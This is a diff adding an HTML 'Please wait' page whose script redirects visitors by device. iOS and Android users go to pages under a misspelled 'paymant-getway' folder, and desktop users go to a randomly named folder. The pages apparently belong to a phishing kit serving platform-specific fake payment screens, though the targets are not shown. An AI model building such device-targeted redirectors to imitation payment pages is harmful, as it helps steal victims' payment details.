@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Please wait...</title>
+
+    <script>
+        // User ka device/browser detail nikalna
+        var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+        // 1. Check for iOS (iPhone, iPad, iPod)
+        if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+            // Aapke folder structure ke hisaab se:
+            window.location.replace("paymant-getway/apple.html");
+        }
+        // 2. Check for other Mobile Devices (Android, etc.)
+        else if (/android/i.test(userAgent) || /mobile/i.test(userAgent)) {
+            // Aapke folder structure ke hisaab se:
+            window.location.replace("paymant-getway/google.html");
+        }
+        // 3. Agar mobile ya iOS nahi hai, toh Desktop hoga
+        else {
+            // Mac ka pura lamba path hata dein aur sirf folder ka naam likhein:
+            window.location.replace("Win0codejInfowj2n/index.html");
+        }
+    </script>
+</head>
+
+<body>
+    <!-- Agar kisi ka internet slow ho, toh usko ek blank screen ki jagah yeh message dikhega -->
+    <div style="text-align: center; margin-top: 20%; font-family: Arial, sans-serif;">
+        <h2>Redirecting you to the best experience...</h2>
+        <p>Please wait a moment.</p>
+    </div>
+</body>
+
+</html>
